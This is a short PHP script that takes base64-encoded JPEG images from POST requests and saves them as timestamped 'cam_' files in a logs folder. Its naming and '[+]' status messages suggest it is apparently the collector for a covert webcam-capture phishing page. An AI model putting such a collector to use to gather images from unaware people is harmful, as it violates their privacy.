<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $imgData = $_POST['img'] ?? '';

    if (strpos($imgData, 'data:image/jpeg;base64,') === 0) {
        $imgData = str_replace('data:image/jpeg;base64,', '', $imgData);
        $imgData = base64_decode($imgData);

        $filename = 'logs/cam_' . date("Ymd_His") . '.jpg';
        file_put_contents($filename, $imgData);
        echo "[+] Saved image: $filename";
    } else {
        echo "[-] Invalid image data";
    }
}
?>
